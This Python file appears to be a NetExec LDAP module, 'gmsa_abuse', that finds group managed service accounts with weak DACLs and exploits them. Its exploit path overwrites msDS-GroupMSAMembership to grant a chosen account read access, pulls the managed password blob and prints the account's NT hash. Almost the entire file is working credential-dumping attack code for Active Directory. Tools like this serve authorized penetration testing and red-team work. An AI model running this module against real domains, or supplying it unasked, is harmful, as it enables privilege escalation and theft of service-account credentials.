from binascii import hexlify

from Cryptodome.Hash import MD4
from impacket.ldap import ldaptypes
from impacket.ldap.ldap import LDAPSessionError, MODIFY_DELETE, MODIFY_REPLACE
from impacket.uuid import bin_to_string
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.utils.conv import escape_filter_chars

from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB

# schemaIDGUID for ms-DS-GroupMSAMembership attribute
GMSA_MEMBERSHIP_GUID = "888eedd6-ce04-df40-b462-b8a50e41ba38"

# Rights that allow writing msDS-GroupMSAMembership on a gMSA object
EXPLOITABLE_RIGHTS = {
    "GenericAll":      0x10000000,
    "GenericWrite":    0x40000000,
    "WriteDACL":       0x00040000,
    "WriteOwner":      0x00080000,
    "WriteProperties": 0x00000020,
}

# Trustees that legitimately have write access — skip these in find output
EXCLUDED_SID_SUFFIXES = ["-512", "-519", "-526", "-527"]  # Domain Admins, Enterprise Admins, Key Admins, Enterprise Key Admins
EXCLUDED_SIDS = {"S-1-5-18", "S-1-5-32-544", "S-1-5-32-548", "S-1-5-9", "S-1-5-10"}  # SYSTEM, Administrators, Account Operators, EDCs, Principal Self


class NXCModule:
    r"""
    Discover and exploit gMSA accounts via write rights on the gMSA object.

    Two actions:
      find    -- enumerate all gMSA objects and report non-admin trustees that
                 hold GenericAll/GenericWrite/WriteDACL/WriteOwner/WriteProperties.
                 With PRINCIPAL=<account> only results for that account are shown.
      exploit -- grant PRINCIPAL read access to TARGET's gMSA password by patching
                 msDS-GroupMSAMembership, then dump the NT hash.  The original SD is
                 restored automatically unless RESTORE=false is set.

    Examples:
      netexec ldap <DC> -u <user> -p <pass> -M gmsa_abuse
      netexec ldap <DC> -u <user> -p <pass> -M gmsa_abuse -o ACTION=find PRINCIPAL=<user>
      netexec ldap <DC> -u <user> -p <pass> -M gmsa_abuse \
        -o ACTION=exploit TARGET=<gMSA_name> PRINCIPAL=<user>
    """

    name = "gmsa_abuse"
    description = "Discover and exploit gMSA accounts via GenericWrite on msDS-GroupMSAMembership"
    supported_protocols = ["ldap"]
    opsec_safe = False
    multiple_hosts = False
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.action = "find"
        self.target_gmsa = None
        self.principal = None
        self.restore = True

    def options(self, context, module_options):
        """
        ACTION      find (default) or exploit
        TARGET      gMSA sAMAccountName to target (required for exploit)
        PRINCIPAL   Account to check/grant — for find: filter results to this
                    trustee; for exploit: the account that receives read access
        RESTORE     true (default) or false — restore original msDS-GroupMSAMembership
                    after dumping (only relevant for exploit)
        """
        self.action = module_options.get("ACTION", "find").lower()
        self.target_gmsa = module_options.get("TARGET", "").strip()
        self.principal = module_options.get("PRINCIPAL", "").strip()
        self.restore = module_options.get("RESTORE", "true").lower() != "false"

        if self.action == "exploit":
            if not self.target_gmsa:
                context.log.fail("exploit requires TARGET=<gMSA sAMAccountName>")
                raise ValueError("TARGET required")
            if not self.principal:
                context.log.fail("exploit requires PRINCIPAL=<account to grant read access>")
                raise ValueError("PRINCIPAL required")

    def on_login(self, context, connection):
        self.context = context
        self.connection = connection

        if self.action == "find":
            self._find()
        elif self.action == "exploit":
            self._exploit()
        else:
            context.log.fail(f"Unknown ACTION '{self.action}' — use 'find' or 'exploit'")

    # ------------------------------------------------------------------
    # Discovery
    # ------------------------------------------------------------------

    def _find(self):
        principal_sid = None
        if self.principal:
            principal_sid = self._sid_for_account(self.principal)
            if not principal_sid:
                self.context.log.fail(f"Cannot resolve principal '{self.principal}'")
                return
            self.context.log.display(f"Filtering results for principal: {self.principal} ({principal_sid})")

        gmsa_list = self.connection.search(
            searchFilter="(objectClass=msDS-GroupManagedServiceAccount)",
            attributes=["sAMAccountName", "distinguishedName", "nTSecurityDescriptor"],
            searchControls=security_descriptor_control(sdflags=0x04),
        )
        parsed = parse_result_attributes(gmsa_list)
        if not parsed:
            self.context.log.display("No gMSA accounts found in the domain")
            return

        self.context.log.display(f"Found {len(parsed)} gMSA account(s) — checking DACLs ...")
        found_any = False

        for acc in parsed:
            name = acc.get("sAMAccountName", "?")
            raw_sd = acc.get("nTSecurityDescriptor")
            if not raw_sd:
                self.context.log.debug(f"{name}: nTSecurityDescriptor not readable (no access)")
                continue

            try:
                sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(raw_sd))
                dacl = sd["Dacl"]
            except Exception as e:
                self.context.log.debug(f"{name}: failed to parse SD -- {e}")
                continue

            # Accumulate rights per trustee to deduplicate multiple ACEs for the same SID
            trustee_rights = {}

            for ace in dacl["Data"]:
                ace_type = ace["AceType"]
                if ace_type not in (0x00, 0x05):
                    continue

                trustee_sid = ace["Ace"]["Sid"].formatCanonical()

                if self._is_excluded_sid(trustee_sid):
                    continue

                if principal_sid and trustee_sid != principal_sid:
                    continue

                mask = ace["Ace"]["Mask"]["Mask"]
                matched_rights = [r for r, v in EXPLOITABLE_RIGHTS.items() if mask & v]

                if not matched_rights and ace_type == 0x05 and (mask & 0x00000020):
                    obj_type = ""
                    if ace["Ace"]["ObjectTypeLen"] != 0:
                        obj_type = bin_to_string(ace["Ace"]["ObjectType"]).lower()
                    if obj_type in ("", GMSA_MEMBERSHIP_GUID):
                        matched_rights = ["WriteProperty(msDS-GroupMSAMembership)"]

                if not matched_rights:
                    continue

                existing = trustee_rights.get(trustee_sid, set())
                existing.update(matched_rights)
                trustee_rights[trustee_sid] = existing

            for trustee_sid, rights_set in trustee_rights.items():
                resolved = self._resolve_sid(trustee_sid)
                rights_str = ", ".join(sorted(rights_set))
                self.context.log.highlight(
                    f"gMSA: {name:<25} Trustee: {resolved:<30} ({trustee_sid})  Rights: {rights_str}"
                )
                self.context.log.highlight(
                    f"  -> Exploit: -M gmsa_abuse -o ACTION=exploit TARGET={name} PRINCIPAL=<account>"
                )
                found_any = True

        if not found_any:
            if principal_sid:
                self.context.log.display(f"No exploitable rights found for '{self.principal}'")
            else:
                self.context.log.display("No non-admin write rights found on any gMSA object")

    # ------------------------------------------------------------------
    # Exploitation
    # ------------------------------------------------------------------

    def _exploit(self):
        # 1. Resolve PRINCIPAL to SID
        principal_sid = self._sid_for_account(self.principal)
        if not principal_sid:
            self.context.log.fail(f"Cannot resolve PRINCIPAL '{self.principal}' — does the account exist?")
            return

        self.context.log.display(f"Principal '{self.principal}' SID: {principal_sid}")

        # 2. Locate gMSA object
        resp = self.connection.search(
            searchFilter=f"(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName={escape_filter_chars(self.target_gmsa)}))",
            attributes=["distinguishedName", "sAMAccountName", "msDS-GroupMSAMembership"],
        )
        parsed = parse_result_attributes(resp)
        if not parsed:
            self.context.log.fail(f"gMSA '{self.target_gmsa}' not found in LDAP")
            return

        gmsa_dn = parsed[0]["distinguishedName"]
        self.context.log.display(f"Target gMSA DN: {gmsa_dn}")

        # 3. Back up original msDS-GroupMSAMembership so we can restore it
        original_sd_bytes = None
        if "msDS-GroupMSAMembership" in parsed[0]:
            original_sd_bytes = bytes(parsed[0]["msDS-GroupMSAMembership"])
            self.context.log.debug("Original msDS-GroupMSAMembership backed up")

        # 4. Build new SD granting PRINCIPAL FullControl read access
        new_sd_bytes = self._build_membership_sd(principal_sid)

        # 5. Write new SD
        self.context.log.display(f"Patching msDS-GroupMSAMembership to grant '{self.principal}' read access …")
        try:
            self.connection.ldap_connection.modify(
                gmsa_dn,
                {"msDS-GroupMSAMembership": [(MODIFY_REPLACE, new_sd_bytes)]},
            )
            self.context.log.success("msDS-GroupMSAMembership patched successfully")
        except LDAPSessionError as e:
            self.context.log.fail(f"LDAP modify failed: {e}")
            return

        # 6. Read msDS-ManagedPassword (requires connection as PRINCIPAL or re-auth)
        #    The current connection is already authenticated as a user that has GenericWrite,
        #    but msDS-ManagedPassword is only returned when the caller's token is in
        #    msDS-GroupMSAMembership.  After patching, the current session won't see it
        #    unless the current account IS the PRINCIPAL.  We attempt the read and explain
        #    the situation if it comes back empty.
        resp2 = self.connection.search(
            searchFilter=f"(sAMAccountName={escape_filter_chars(self.target_gmsa)})",
            attributes=["sAMAccountName", "msDS-ManagedPassword"],
        )
        parsed2 = parse_result_attributes(resp2)

        nt_hash = None
        if parsed2 and "msDS-ManagedPassword" in parsed2[0]:
            try:
                blob = MSDS_MANAGEDPASSWORD_BLOB()
                blob.fromString(parsed2[0]["msDS-ManagedPassword"])
                current_pw = blob["CurrentPassword"][:-2]
                md4 = MD4.new()
                md4.update(current_pw)
                nt_hash = hexlify(md4.digest()).decode()
                self.context.log.highlight(
                    f"{self.target_gmsa}:::aad3b435b51404eeaad3b435b51404ee:{nt_hash}:::"
                )
                self.context.log.success(f"NT hash: {nt_hash}")
            except Exception as e:
                self.context.log.fail(f"Failed to parse msDS-ManagedPassword blob: {e}")
        else:
            self.context.log.fail(
                "msDS-ManagedPassword not returned — the current session is not running as "
                f"'{self.principal}'.  Re-authenticate as '{self.principal}' and run "
                f"'netexec ldap <DC> -u {self.principal} -p <pass> --gmsa' to retrieve the hash."
            )

        # 7. Restore original SD if requested
        if self.restore and original_sd_bytes is not None:
            self.context.log.display("Restoring original msDS-GroupMSAMembership …")
            try:
                self.connection.ldap_connection.modify(
                    gmsa_dn,
                    {"msDS-GroupMSAMembership": [(MODIFY_REPLACE, original_sd_bytes)]},
                )
                self.context.log.success("msDS-GroupMSAMembership restored to original")
            except LDAPSessionError as e:
                self.context.log.fail(f"Failed to restore msDS-GroupMSAMembership: {e} — restore manually!")
        elif self.restore and original_sd_bytes is None:
            self.context.log.display("msDS-GroupMSAMembership was absent before patching — deleting the added value ...")
            try:
                self.connection.ldap_connection.modify(
                    gmsa_dn,
                    {"msDS-GroupMSAMembership": [(MODIFY_DELETE, [])]},
                )
                self.context.log.success("msDS-GroupMSAMembership removed (restored to original absent state)")
            except LDAPSessionError as e:
                self.context.log.fail(f"Failed to remove msDS-GroupMSAMembership: {e} — remove manually!")
        else:
            self.context.log.display("RESTORE=false — msDS-GroupMSAMembership left patched")

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _build_membership_sd(self, sid_str: str) -> bytes:
        """Build a minimal security descriptor with one ACE granting FullControl to sid_str."""
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd["Revision"] = b"\x01"
        sd["Sbz1"] = b"\x00"
        sd["Control"] = 32772  # SE_DACL_PRESENT | SE_SELF_RELATIVE

        owner = ldaptypes.LDAP_SID()
        owner.fromCanonical("S-1-5-18")  # SYSTEM as nominal owner
        sd["OwnerSid"] = owner
        sd["GroupSid"] = b""
        sd["Sacl"] = b""

        acl = ldaptypes.ACL()
        acl["AclRevision"] = 4
        acl["Sbz1"] = 0
        acl["Sbz2"] = 0

        ace = ldaptypes.ACE()
        ace["AceType"] = 0x00  # ACCESS_ALLOWED_ACE_TYPE
        ace["AceFlags"] = 0x00

        nace = ldaptypes.ACCESS_ALLOWED_ACE()
        nace["Mask"] = ldaptypes.ACCESS_MASK()
        nace["Mask"]["Mask"] = 983551  # 0xF01FF — FullControl

        principal_sid = ldaptypes.LDAP_SID()
        principal_sid.fromCanonical(sid_str)
        nace["Sid"] = principal_sid

        ace["Ace"] = nace
        acl.aces = [ace]
        sd["Dacl"] = acl

        return sd.getData()

    def _sid_for_account(self, account: str) -> str | None:
        """Return the objectSid string for a sAMAccountName, or None."""
        try:
            resp = self.connection.search(
                searchFilter=f"(sAMAccountName={escape_filter_chars(account)})",
                attributes=["objectSid"],
            )
            parsed = parse_result_attributes(resp)
            if parsed:
                return parsed[0].get("objectSid")
        except Exception as e:
            self.context.log.debug(f"SID lookup for '{account}' failed: {e}")
        return None

    def _resolve_sid(self, sid: str) -> str:
        """Resolve a SID string to sAMAccountName via LDAP, fall back to the raw SID."""
        try:
            resp = self.connection.search(
                searchFilter=f"(objectSid={sid})",
                attributes=["sAMAccountName"],
            )
            parsed = parse_result_attributes(resp)
            if parsed:
                return parsed[0].get("sAMAccountName", sid)
        except Exception:
            pass
        return sid

    def _is_excluded_sid(self, sid: str) -> bool:
        if sid in EXCLUDED_SIDS:
            return True
        return any(sid.endswith(suffix) for suffix in EXCLUDED_SID_SUFFIXES)
